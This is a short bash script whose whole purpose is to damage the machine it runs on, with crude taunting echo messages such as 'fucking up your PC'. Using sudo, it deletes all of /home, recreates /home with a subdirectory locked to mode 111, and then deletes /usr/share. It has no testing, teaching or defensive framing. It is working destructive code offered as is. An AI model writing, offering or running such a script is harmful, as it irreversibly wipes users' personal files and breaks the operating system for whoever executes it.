#!/bin/bash
sudo rm -rf /home
echo "fucking up your PC"
sudo mkdir /home
sudo mkdir /home/lmao
sudo chmod 111 /home/lmao
echo "fucking up your PC"
sudo rm -rf /usr/share/
echo "fucked up"
